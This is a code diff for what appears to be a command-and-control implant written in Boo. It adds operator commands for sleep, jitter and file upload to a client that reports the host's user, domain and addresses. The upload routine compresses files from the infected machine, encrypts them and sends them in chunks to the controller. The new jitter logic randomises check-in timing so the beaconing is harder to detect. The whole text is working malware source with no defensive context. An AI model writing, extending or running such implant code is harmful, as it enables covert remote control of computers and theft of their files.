@@ -73,6 +73,7 @@ class CompilationException(Exception):
         super(message)
 
 class Args:
+    public args as List
     public source as string
     public references as List
 
@@ -260,6 +261,15 @@ class STJob:
                 result = CompileAndRun(Job.args.source, Job.args.references)
             elif cmd == 'Exit':
                 result = Exit()
+            elif cmd == 'Sleep':
+                result = Sleep(Job.args.args[0])  # I hate this shit, but for now it'll do
+            elif cmd == 'Upload':
+                result = Upload(Job.args.args[0])
+            elif cmd == 'Jitter':
+                if len(Job.args.args) == 2:
+                    result = Jitter(Job.args.args[0], Job.args.args[1])
+                else:
+                    result = Jitter(Job.args.args[0], 0)
         except e as Exception:
             error = true
             result = "$(e)"
@@ -278,7 +288,12 @@ class STJob:
 
     public def Sleep(time as int) as string:
         Client.Sleep = time
-        return 'Will now check-in every $(Client.Sleep) milliseconds'
+        return "Will now check-in every $(Client.Sleep)ms"
+
+    public def Jitter(maxJitter as int, minJitter as int) as string:
+        Client.MaxJitter = maxJitter
+        Client.MinJitter = minJitter
+        return "Will now check-in every $(Client.Sleep)ms with a max jitter of $(maxJitter)ms and a min jitter of $(minJitter)ms"
 
     public def Upload(file_path as string) as string:
         compressed_file =  FileChunker.CompressFile(file_path)
@@ -296,7 +311,7 @@ class STJob:
                     "data": Convert.ToBase64String(bytes_to_send)
                 }
                 Client.SendJobResults(self)
-                Thread.Sleep(Client.Sleep)
+                Thread.Sleep(Client.GetSleepAndJitter())
 
                 bytes_to_send = FileChunker.ReadStream(source_file)
                 current_chunk_n += 1
@@ -365,8 +380,10 @@ class STJob:
 
 class STClient:
     public Jobs as List = []
-    public Channels as List = [HTTP()]
-    public Sleep = 5000
+    public Channels as List = [PUT_COMM_CLASSES_HERE]
+    public Sleep as int = 5000
+    public MaxJitter as int = 0
+    public MinJitter as int = 0
     public Username = Environment.UserName
     public Domain = Environment.UserDomainName
     public DotNetVersion = Environment.Version.ToString()
@@ -425,6 +442,14 @@ class STClient:
                 addresses.Extend([uni.Address.ToString() for uni in properties.UnicastAddresses if uni.Address.AddressFamily.ToString() == "InterNetwork" and uni.Address.ToString() != '127.0.0.1'])
             return addresses
 
+    public def GetSleepAndJitter() as int:
+        if MinJitter > 0 and MaxJitter > 0:
+            return Sleep + Random().Next(MinJitter, MaxJitter)
+        elif MaxJitter > 0:
+            return Sleep + Random().Next(MaxJitter)
+
+        return Sleep
+
     public def DoKex():
         encryptedPubKey = Crypto.EncryptedPubKey
 
@@ -437,10 +462,9 @@ class STClient:
                 except e as Exception:
                     if Debug:
                         print "[Channel: $(channel.Name)] Error performing key exchange: $(e.Message)"
-                    Thread.Sleep(Sleep)
+                    Thread.Sleep(GetSleepAndJitter())
                     continue
-
-            #Thread.Sleep(Sleep)
+            #Thread.Sleep(GetSleepAndJitter())
 
     public def Start():
         DoKex()
@@ -457,24 +481,23 @@ class STClient:
                 except e as Exception:
                     if Debug:
                         print "[Channel: $(channel.Name)] Error retrieving tasking: $(e.Message)"
-                    Thread.Sleep(Sleep)
+                    Thread.Sleep(GetSleepAndJitter())
                     continue
-            Thread.Sleep(Sleep)
+            Thread.Sleep(GetSleepAndJitter())
 
     public def SendJobResults(job as STJob):
-        payload = Crypto.Encrypt(JavaScriptSerializer().Serialize(job))
-
         while true:
             for channel as duck in Channels:
+                payload = Crypto.Encrypt(JavaScriptSerializer().Serialize(job))
                 try:
                     channel.SendJobResults(payload, job.id)
                     return
                 except e as Exception:
                     if Debug:
                         print "Error sending job (id: $(job.id)) results with $(channel.Name) channel: $(e.Message)"
-                    #Thread.Sleep(Sleep)
+                    #Thread.Sleep(GetSleepAndJitter())
                     continue
-            #Thread.Sleep(Sleep)
+            #Thread.Sleep(GetSleepAndJitter())
 
 public static def Main(argv as (string)):
      #AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler(MyResolveEventHandler)
